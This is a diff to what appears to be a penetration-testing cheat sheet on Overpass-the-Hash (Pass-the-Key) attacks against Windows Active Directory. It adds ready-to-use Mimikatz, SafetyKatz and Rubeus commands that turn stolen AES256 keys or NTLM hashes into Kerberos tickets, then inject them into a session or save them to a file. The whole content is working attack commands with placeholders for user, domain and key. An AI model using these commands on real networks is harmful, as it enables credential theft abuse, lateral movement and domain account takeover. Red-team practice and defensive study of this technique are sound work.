@@ -1,13 +1,19 @@
-% Overpass-The-Hash
+% Overpass-the-Hash (Pass-the-Key)
 
-# Invoke-Mimikatz (logon type 9)
+# Use Mimikatz to perform an Overpass-the-Hash attack with an AES256 key (logon type 9)
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:<user> /domain:<domain> /aes256:<aeskey> /run:<program-to-run>"'
 
-# Safetykatz (logon type 9)
-Safetykatz.exe "sekurlsa::pth /user:<user> /domain:<domain> /aes256:<aeskey> /run:<program-to-run>" "exit" 
+# Use Mimikatz to perform an Overpass-the-Hash attack with an RC4 (NTLM) hash
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:<user> /domain:<domain> /rc4:<ntlm-hash> /run:<program-to-run>"'
 
-# Rubeus (without elevation - deletes alomst all tickets)
+# Use SafetyKatz to perform Overpass-the-Hash with AES256 key
+Safetykatz.exe "sekurlsa::pth /user:<user> /domain:<domain> /aes256:<aeskey> /run:<program-to-run>" "exit"
+
+# Request a Ticket Granting Ticket (TGT) with Rubeus using an NTLM hash and pass-the-ticket (PTT)
 Rubeus.exe asktgt /user:<user> /rc4:<ntlm-hash> /ptt
 
-# Rubeus (with elevation - logon type 9)
+# Request a TGT with Rubeus using an AES key, create a logon session (netonly) for a specific program, and inject the ticket (requires elevation)
 Rubeus.exe asktgt /user:<user> /aes256:<aeskey> /opsec /createnetonly:<program-to-run> /show /ptt
+
+# Request a TGT with Rubeus for a service account using an AES key and output the ticket to file
+Rubeus.exe asktgt /user:<user> /aes256:<aeskey> /outfile:<path-to-ticket> /domain:<domain>
